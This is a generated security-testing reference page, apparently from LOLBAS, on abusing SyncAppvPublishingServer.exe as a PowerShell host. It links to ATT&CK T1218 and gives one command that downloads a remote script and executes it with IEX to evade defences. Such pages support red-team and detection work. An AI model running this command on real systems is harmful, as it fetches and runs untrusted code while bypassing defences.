---
parsed_by: focuslocust
source: commands
type: generated
---
# SyncAppvPublishingServer Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## SyncAppvPublishingServer.exe

Tool page: [SyncAppvPublishingServer.exe](../../tools/windows/syncappvpublishingserver.exe.md)

### Use SyncAppvPublishingServer as a Powershell host to execute Powershell code. Evade defensive counter measures

```text
SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX"
```

Description:

Example command on how inject Powershell code into the process

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Syncappvpublishingserver.yml` |
| Evidence | Command preserved from source parser. |
